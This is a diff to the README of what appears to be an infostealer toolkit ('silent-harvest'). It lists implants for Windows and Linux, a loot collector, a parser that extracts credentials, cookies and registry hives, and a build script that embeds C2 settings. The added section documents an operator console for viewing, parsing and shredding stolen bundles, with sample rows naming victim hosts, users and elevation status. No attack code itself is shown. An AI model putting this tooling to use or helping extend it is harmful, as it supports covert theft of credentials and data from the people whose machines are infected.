@@ -38,6 +38,8 @@ implant (target)                                operator
 | `linux/sh_harvest.py` | Linux implant — single-file Python 3, stdlib only |
 | `server/collector.py` | threaded loot receiver + encrypted store |
 | `server/parse_loot.py` | bundle → report/creds/cookie files, hive dump hookup |
+| `server/tui.py` | operator console TUI: browse/parse/shred loot, live watch |
+| `server/term.py` | shared ANSI/terminal helpers (color, tables, VT on Windows) |
 | `server/shcrypto.py` | container format reference implementation (Python) |
 | `build.bat` | Windows implant build (bakes C2 + PSK + TLS pin + auth token) |
 | `tools/genconfig.ps1` | config generation (PSK obfuscation, fingerprinting) |
@@ -217,6 +219,40 @@ loot/
 ```
 
 ---
+
+### 4. Or use the operator console (TUI)
+
+```bash
+cd server
+python tui.py                 # full-screen console over the loot store
+```
+
+Leave it open next to the collector — **watch mode** picks up new bundles
+every 2 seconds and refreshes the table live.
+
+```
+ silent-harvest  4 bundles · 12.9 MB · 2 parsed   [watch]
+──────────────────────────────────────────────────────────────────────────────
+ WHEN     HOST       USER   PLAT     ELEV  PARTS  SIZE    PARSED
+▸ 2m ago  ASHFIEX3   user   windows  -     16     2.6 MB  ✓
+  18m ago lab-wks-2  ops    linux    yes   9      4.1 MB  ✓
+  1h ago  fin-srv01  svc    windows  yes   6     12.0 KB  ·
+  ↑↓ select · Enter detail · p parse · r redact · s shred · l log · h help · q quit
+```
+
+| key | action |
+|---|---|
+| `↑↓`/`jk`, `PgUp/PgDn`, `Home/End` | navigate the bundle list |
+| `Enter` | bundle detail: victim info + full parts table |
+| `v` / `m` / `c` | page through `report.txt` / `manifest.json` / `creds.json` (scroll: `↑↓ PgUp/PgDn g/G`) |
+| `p` / `r` | parse the selected bundle (full / redacted) — same engine as the CLI |
+| `s` | shred the selected bundle (overwrites, asks for confirmation) |
+| `l` | access-log pager (auth verdicts, accepts, rejects) |
+| `R` | rescan now · `h` help · `q` quit |
+
+Pure stdlib (no curses — works in Windows conhost/Windows Terminal and any
+POSIX terminal). Colors auto-disable on non-tty or `NO_COLOR`; `--demo`
+renders a headless frame for CI.
 
 ## What gets collected
 
